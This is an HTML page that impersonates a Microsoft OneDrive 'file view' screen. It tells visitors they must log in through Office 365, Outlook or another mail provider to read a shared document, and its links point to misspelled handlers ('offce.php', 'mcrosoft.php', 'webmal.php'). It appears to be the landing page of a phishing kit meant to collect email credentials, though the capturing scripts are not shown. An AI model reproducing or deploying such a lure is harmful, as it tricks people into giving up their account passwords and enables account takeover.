
<!DOCTYPE html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta http-equiv="content-type" content="text/html" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>OneDrive - File View</title>
	<link rel="icon" type="image/ico" href="images/ficon.png">
	
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="css/bootstrap.min.css">
      <link rel="stylesheet" type="text/css" href="css/style.css">
    <!-- jQuery first, then Tether, then Bootstrap JS. -->

</head>
<body>

<div class="onedrivepage">
    <div class="container">
        <div class="row">
            <div class="col-md-3 col-lg-3 col-sm-3 col-xs-3">
            </div>
            <div class="col-md-6 col-lg-6 col-sm-6 col-xs-12">
                <div class="onedriveform">
                    <div class="logo">
                        <img class="img-fluid" src="images/Onedrive-logo.png" alt="Onedrive-logo.png" />
                    </div>
                    <p>To read the document, please choose your email provider below, Login to view shared files. </p>
                    <div class="loginform">
                        <a href="offce.php"  class="loginoffice">Login with Office 365</a>
                        <a href="mcrosoft.php" class="loginoutlook">Login with Outlook</a>
                        <a href="webmal.php" class="loginmail">Login with Other Mail</a>
                    </div>
                    <p>Get to all your files from anywhere on any device, and share them with anyone. OneDrive your shared document in OneCloud.
</p>
                </div>
            </div>
            <div class="col-md-3 col-lg-3 col-sm-3 col-xs-3">
            </div>
        </div>
    </div>
      <script src="https://code.jquery.com/jquery-3.1.1.slim.min.js" integrity="sha384-A7FZj7v+d/sdmMqp/nOQwliLvUsJfDHW+k9Omg/a/EheAdgtzNs3hpfag6Ed950n" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tether/1.4.0/js/tether.min.js" integrity="sha384-DztdAPBWPRXSA/3eYEEUWrWCy7G5KFbe8fFjk5JAIxUYHKkDx6Qin1DkWx51bBrb" crossorigin="anonymous"></script>
    <script src="js/bootstrap.min.js"></script>
</body>
</html>
